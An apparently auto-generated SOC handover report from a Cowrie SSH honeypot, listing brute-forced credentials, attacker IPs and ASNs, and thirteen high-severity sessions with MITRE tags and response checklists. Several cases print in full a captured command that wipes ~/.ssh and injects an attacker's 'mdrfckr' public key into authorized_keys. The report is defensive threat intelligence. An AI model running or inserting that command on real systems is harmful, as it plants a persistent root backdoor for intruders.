# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-23 |
| **Generated At** | 2026-03-23T14:53:27Z |
| **Shift Time** | 14:53 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **78** |
| Confirmed Threats | **69** |
| False Positives Filtered | **9** (11.5%) |
| Unique Attacker IPs | **36** |
| Countries of Origin | **17** |
| High Severity Cases | **13** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **65** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **51** |
| Unique Credential Pairs | **40** |
| Unique Usernames | **16** |
| Unique Passwords | **39** |
| Successful Auth Pairs | **13** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 14 |
| `root` | 14 |
| `345gs5662d34` | 5 |
| `centos` | 3 |
| `GET / HTTP/1.1` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |
| `ubuntu` | 2 |
| `Host: 13.235.92.17:23` | 2 |
| `Accept: */*` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `3245gs5662d34` | 5 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 2 |
| `Accept-Encoding: gzip` | `` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123Password` | `118.193.61.170` | 2026-03-23T13:05:20 |
| `root` | `3245gs5662d34` | `118.193.61.170` | 2026-03-23T13:05:24 |
| `root` | `ubuntu` | `106.124.137.21` | 2026-03-23T13:17:00 |
| `root` | `Test123!` | `34.133.99.235` | 2026-03-23T13:24:29 |
| `root` | `3245gs5662d34` | `34.133.99.235` | 2026-03-23T13:24:35 |
| `root` | `admin` | `216.232.188.224` | 2026-03-23T13:25:03 |
| `root` | `iamroot` | `116.193.191.104` | 2026-03-23T13:26:55 |
| `root` | `3245gs5662d34` | `116.193.191.104` | 2026-03-23T13:27:01 |
| `root` | `Passw0rd` | `118.26.36.248` | 2026-03-23T14:03:11 |
| `root` | `3245gs5662d34` | `118.26.36.248` | 2026-03-23T14:03:14 |
| `root` | `Pass@word1` | `47.76.106.149` | 2026-03-23T14:33:28 |
| `root` | `3245gs5662d34` | `47.76.106.149` | 2026-03-23T14:33:31 |
| `root` | `admin123` | `116.110.217.155` | 2026-03-23T14:36:23 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `116.193.191.104`, `34.133.99.235`, `47.76.106.149`, `118.26.36.248`, `118.193.61.170`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **36** |
| Unique ASNs | **29** |
| High-Risk ASNs | **23** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS10030` | Celcom Axiata Berhad | 2 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS9829` | National Internet Backbone | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS852` | TELUS Communications Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (13)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-16c738f7b6fd

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-03-23 13:05 |
| **Last Seen** | 2026-03-23 13:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 13:05:19` | `cowrie.session.connect` |
| `2026-03-23 13:05:19` | `cowrie.client.version` |
| `2026-03-23 13:05:19` | `cowrie.client.kex` |
| `2026-03-23 13:05:20` | `cowrie.login.success` |
| `2026-03-23 13:05:20` | `cowrie.session.params` |
| `2026-03-23 13:05:20` | `cowrie.command.input` |
| `2026-03-23 13:05:20` | `cowrie.command.failed` |
| `2026-03-23 13:05:20` | `cowrie.log.closed` |
| `2026-03-23 13:05:20` | `cowrie.session.params` |
| `2026-03-23 13:05:20` | `cowrie.command.input` |
| `2026-03-23 13:05:21` | `cowrie.session.file_download` |
| `2026-03-23 13:05:21` | `cowrie.log.closed` |
| `2026-03-23 13:05:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89679784931d

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-03-23 13:05 |
| **Last Seen** | 2026-03-23 13:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 13:05:23` | `cowrie.session.connect` |
| `2026-03-23 13:05:23` | `cowrie.client.version` |
| `2026-03-23 13:05:23` | `cowrie.client.kex` |
| `2026-03-23 13:05:24` | `cowrie.login.success` |
| `2026-03-23 13:05:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a42843130a3e

| Field | Detail |
|---|---|
| **Source IP** | `106.124.137[.]21` |
| **First Seen** | 2026-03-23 13:16 |
| **Last Seen** | 2026-03-23 13:22 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 13:16:59` | `cowrie.session.connect` |
| `2026-03-23 13:16:59` | `cowrie.client.version` |
| `2026-03-23 13:16:59` | `cowrie.client.kex` |
| `2026-03-23 13:17:00` | `cowrie.login.success` |
| `2026-03-23 13:22:00` | `cowrie.session.file_upload` |
| `2026-03-23 13:22:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.124.137[.]21` to AbuseIPDB if not already reported
- [ ] Block `106.124.137[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e02e00c5d66

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-03-23 13:24 |
| **Last Seen** | 2026-03-23 13:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 13:24:28` | `cowrie.session.connect` |
| `2026-03-23 13:24:28` | `cowrie.client.version` |
| `2026-03-23 13:24:28` | `cowrie.client.kex` |
| `2026-03-23 13:24:29` | `cowrie.login.success` |
| `2026-03-23 13:24:29` | `cowrie.session.params` |
| `2026-03-23 13:24:29` | `cowrie.command.input` |
| `2026-03-23 13:24:29` | `cowrie.command.failed` |
| `2026-03-23 13:24:30` | `cowrie.log.closed` |
| `2026-03-23 13:24:30` | `cowrie.session.params` |
| `2026-03-23 13:24:30` | `cowrie.command.input` |
| `2026-03-23 13:24:31` | `cowrie.session.file_download` |
| `2026-03-23 13:24:31` | `cowrie.log.closed` |
| `2026-03-23 13:24:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3158b4f01ca0

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-03-23 13:24 |
| **Last Seen** | 2026-03-23 13:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 13:24:34` | `cowrie.session.connect` |
| `2026-03-23 13:24:34` | `cowrie.client.version` |
| `2026-03-23 13:24:34` | `cowrie.client.kex` |
| `2026-03-23 13:24:35` | `cowrie.login.success` |
| `2026-03-23 13:24:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6b543aaf25b

| Field | Detail |
|---|---|
| **Source IP** | `216.232.188[.]224` |
| **First Seen** | 2026-03-23 13:25 |
| **Last Seen** | 2026-03-23 13:26 |
| **Session Duration** | 85s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 13:25:01` | `cowrie.session.connect` |
| `2026-03-23 13:25:01` | `cowrie.client.version` |
| `2026-03-23 13:25:01` | `cowrie.client.kex` |
| `2026-03-23 13:25:02` | `cowrie.login.failed` |
| `2026-03-23 13:25:03` | `cowrie.login.success` |
| `2026-03-23 13:25:04` | `cowrie.session.params` |
| `2026-03-23 13:25:04` | `cowrie.command.input` |
| `2026-03-23 13:25:04` | `cowrie.command.failed` |
| `2026-03-23 13:25:04` | `cowrie.log.closed` |
| `2026-03-23 13:25:05` | `cowrie.session.params` |
| `2026-03-23 13:25:05` | `cowrie.command.input` |
| `2026-03-23 13:25:05` | `cowrie.log.closed` |
| `2026-03-23 13:25:06` | `cowrie.session.params` |
| `2026-03-23 13:25:06` | `cowrie.command.input` |
| `2026-03-23 13:25:06` | `cowrie.log.closed` |
| `2026-03-23 13:25:07` | `cowrie.session.params` |
| `2026-03-23 13:25:07` | `cowrie.command.input` |
| `2026-03-23 13:25:07` | `cowrie.log.closed` |
| `2026-03-23 13:25:08` | `cowrie.session.params` |
| `2026-03-23 13:25:08` | `cowrie.command.input` |
| `2026-03-23 13:25:08` | `cowrie.log.closed` |
| `2026-03-23 13:25:09` | `cowrie.session.params` |
| `2026-03-23 13:25:09` | `cowrie.command.input` |
| `2026-03-23 13:25:09` | `cowrie.log.closed` |
| `2026-03-23 13:25:09` | `cowrie.session.params` |
| `2026-03-23 13:25:09` | `cowrie.command.input` |
| `2026-03-23 13:25:10` | `cowrie.log.closed` |
| `2026-03-23 13:25:10` | `cowrie.session.params` |
| `2026-03-23 13:25:10` | `cowrie.command.input` |
| `2026-03-23 13:25:11` | `cowrie.log.closed` |
| `2026-03-23 13:25:11` | `cowrie.session.params` |
| `2026-03-23 13:25:11` | `cowrie.command.input` |
| `2026-03-23 13:25:12` | `cowrie.log.closed` |
| `2026-03-23 13:26:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `216.232.188[.]224` to AbuseIPDB if not already reported
- [ ] Block `216.232.188[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e05b75b56bb

| Field | Detail |
|---|---|
| **Source IP** | `116.193.191[.]104` |
| **First Seen** | 2026-03-23 13:26 |
| **Last Seen** | 2026-03-23 13:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 13:26:54` | `cowrie.session.connect` |
| `2026-03-23 13:26:54` | `cowrie.client.version` |
| `2026-03-23 13:26:55` | `cowrie.client.kex` |
| `2026-03-23 13:26:55` | `cowrie.login.success` |
| `2026-03-23 13:26:56` | `cowrie.session.params` |
| `2026-03-23 13:26:56` | `cowrie.command.input` |
| `2026-03-23 13:26:56` | `cowrie.command.failed` |
| `2026-03-23 13:26:56` | `cowrie.log.closed` |
| `2026-03-23 13:26:57` | `cowrie.session.params` |
| `2026-03-23 13:26:57` | `cowrie.command.input` |
| `2026-03-23 13:26:57` | `cowrie.session.file_download` |
| `2026-03-23 13:26:57` | `cowrie.log.closed` |
| `2026-03-23 13:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.191[.]104` to AbuseIPDB if not already reported
- [ ] Block `116.193.191[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdbbc11b748a

| Field | Detail |
|---|---|
| **Source IP** | `116.193.191[.]104` |
| **First Seen** | 2026-03-23 13:27 |
| **Last Seen** | 2026-03-23 13:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 13:27:00` | `cowrie.session.connect` |
| `2026-03-23 13:27:00` | `cowrie.client.version` |
| `2026-03-23 13:27:00` | `cowrie.client.kex` |
| `2026-03-23 13:27:01` | `cowrie.login.success` |
| `2026-03-23 13:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.191[.]104` to AbuseIPDB if not already reported
- [ ] Block `116.193.191[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80b1ab674178

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-03-23 14:03 |
| **Last Seen** | 2026-03-23 14:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 14:03:11` | `cowrie.session.connect` |
| `2026-03-23 14:03:11` | `cowrie.client.version` |
| `2026-03-23 14:03:11` | `cowrie.client.kex` |
| `2026-03-23 14:03:11` | `cowrie.login.success` |
| `2026-03-23 14:03:12` | `cowrie.session.params` |
| `2026-03-23 14:03:12` | `cowrie.command.input` |
| `2026-03-23 14:03:12` | `cowrie.command.failed` |
| `2026-03-23 14:03:12` | `cowrie.log.closed` |
| `2026-03-23 14:03:12` | `cowrie.session.params` |
| `2026-03-23 14:03:12` | `cowrie.command.input` |
| `2026-03-23 14:03:12` | `cowrie.session.file_download` |
| `2026-03-23 14:03:12` | `cowrie.log.closed` |
| `2026-03-23 14:03:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19faf2f1ce15

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-03-23 14:03 |
| **Last Seen** | 2026-03-23 14:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 14:03:14` | `cowrie.session.connect` |
| `2026-03-23 14:03:14` | `cowrie.client.version` |
| `2026-03-23 14:03:14` | `cowrie.client.kex` |
| `2026-03-23 14:03:14` | `cowrie.login.success` |
| `2026-03-23 14:03:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1def4a108014

| Field | Detail |
|---|---|
| **Source IP** | `47.76.106[.]149` |
| **First Seen** | 2026-03-23 14:33 |
| **Last Seen** | 2026-03-23 14:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 14:33:27` | `cowrie.session.connect` |
| `2026-03-23 14:33:27` | `cowrie.client.version` |
| `2026-03-23 14:33:27` | `cowrie.client.kex` |
| `2026-03-23 14:33:28` | `cowrie.login.success` |
| `2026-03-23 14:33:28` | `cowrie.session.params` |
| `2026-03-23 14:33:28` | `cowrie.command.input` |
| `2026-03-23 14:33:28` | `cowrie.command.failed` |
| `2026-03-23 14:33:28` | `cowrie.log.closed` |
| `2026-03-23 14:33:28` | `cowrie.session.params` |
| `2026-03-23 14:33:28` | `cowrie.command.input` |
| `2026-03-23 14:33:28` | `cowrie.session.file_download` |
| `2026-03-23 14:33:28` | `cowrie.log.closed` |
| `2026-03-23 14:33:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.76.106[.]149` to AbuseIPDB if not already reported
- [ ] Block `47.76.106[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0979d3259752

| Field | Detail |
|---|---|
| **Source IP** | `47.76.106[.]149` |
| **First Seen** | 2026-03-23 14:33 |
| **Last Seen** | 2026-03-23 14:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 14:33:30` | `cowrie.session.connect` |
| `2026-03-23 14:33:30` | `cowrie.client.version` |
| `2026-03-23 14:33:30` | `cowrie.client.kex` |
| `2026-03-23 14:33:31` | `cowrie.login.success` |
| `2026-03-23 14:33:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.76.106[.]149` to AbuseIPDB if not already reported
- [ ] Block `47.76.106[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c86059aaf602

| Field | Detail |
|---|---|
| **Source IP** | `116.110.217[.]155` |
| **First Seen** | 2026-03-23 14:36 |
| **Last Seen** | 2026-03-23 14:36 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 14:36:14` | `cowrie.session.connect` |
| `2026-03-23 14:36:14` | `cowrie.client.version` |
| `2026-03-23 14:36:19` | `cowrie.client.kex` |
| `2026-03-23 14:36:23` | `cowrie.login.success` |
| `2026-03-23 14:36:24` | `cowrie.direct-tcpip.request` |
| `2026-03-23 14:36:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-03-23 14:36:24` | `cowrie.direct-tcpip.data` |
| `2026-03-23 14:36:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.217[.]155` to AbuseIPDB if not already reported
- [ ] Block `116.110.217[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `183.81.33[.]183` | **14** | 2026-03-23 13:04 | 2026-03-23 14:52 | 5m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.1[.]74` | **10** | 2026-03-23 13:24 | 2026-03-23 13:41 | 14m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `16.58.56[.]214` | **7** | 2026-03-23 14:06 | 2026-03-23 14:14 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `118.193.61[.]170` | **2** | 2026-03-23 13:03 | 2026-03-23 13:05 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.80.88[.]247` | **2** | 2026-03-23 13:31 | 2026-03-23 13:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.143[.]178` | 1 | 2026-03-23 14:08 | 2026-03-23 14:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.126.54[.]23` | 1 | 2026-03-23 14:36 | 2026-03-23 14:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.70.23[.]250` | 1 | 2026-03-23 13:41 | 2026-03-23 13:41 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.19.44[.]93` | 1 | 2026-03-23 14:03 | 2026-03-23 14:03 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.31.107[.]103` | 1 | 2026-03-23 14:34 | 2026-03-23 14:36 | 120s | 0 | `T1592` | 🟢 LOW |
